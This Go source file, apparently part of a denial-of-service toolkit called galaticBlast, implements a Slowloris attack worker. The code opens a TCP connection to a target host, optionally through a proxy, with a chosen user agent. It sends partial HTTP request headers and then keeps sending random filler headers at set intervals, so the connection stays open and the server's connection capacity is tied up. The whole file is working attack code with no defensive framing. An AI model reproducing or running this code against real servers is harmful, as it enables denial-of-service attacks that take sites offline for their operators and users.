package http

import (
	"context"
	"fmt"
	"math/rand"
	"time"

	"github.com/galaticBlast/galaticBlast/internal/engine"
	"github.com/galaticBlast/galaticBlast/internal/netutil"
)

type SlowlorisWorker struct{}

func NewSlowlorisWorker() *SlowlorisWorker {
	return &SlowlorisWorker{}
}

func (w *SlowlorisWorker) Fire(ctx context.Context, params engine.AttackParams, proxy engine.Proxy, userAgent string, logCh chan<- engine.AttackStats) error {
	conn, err := netutil.DialedTCPClient(params.TargetNode.Scheme, params.TargetNode.Host, params.TargetNode.Port, proxy)
	if err != nil {
		engine.SendAttackLogIfVerbose(params.Verbose, logCh, "slowloris connect failed: "+err.Error())
		return nil
	}

	defer func() {
		select {
		case <-ctx.Done():
			conn.Close()
		default:
		}
	}()

	initialHeaders := []string{
		fmt.Sprintf("GET / HTTP/1.1\r\n"),
		fmt.Sprintf("Host: %s\r\n", params.TargetNode.Host),
		fmt.Sprintf("User-Agent: %s\r\n", userAgent),
		fmt.Sprintf("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"),
		fmt.Sprintf("Accept-Language: en-US,en;q=0.5\r\n"),
		fmt.Sprintf("Connection: keep-alive\r\n"),
	}

	for _, header := range initialHeaders {
		if _, err := conn.Write([]byte(header)); err != nil {
			conn.Close()
			engine.SendAttackLogIfVerbose(params.Verbose, logCh, "slowloris write failed: "+err.Error())
			return nil
		}
		time.Sleep(params.PacketDelay)
	}

	for {
		select {
		case <-ctx.Done():
			conn.Close()
			return nil
		case <-time.After(params.PacketDelay):
			keepAliveHeader := fmt.Sprintf("X-a: %d\r\n", rand.Intn(100000))
			if _, err := conn.Write([]byte(keepAliveHeader)); err != nil {
				conn.Close()
				engine.SendAttackLogIfVerbose(params.Verbose, logCh, "slowloris keepalive failed: "+err.Error())
				return nil
			}
			engine.SendAttackLogIfVerbose(params.Verbose, logCh, "slowloris keepalive sent")
		}
	}
}
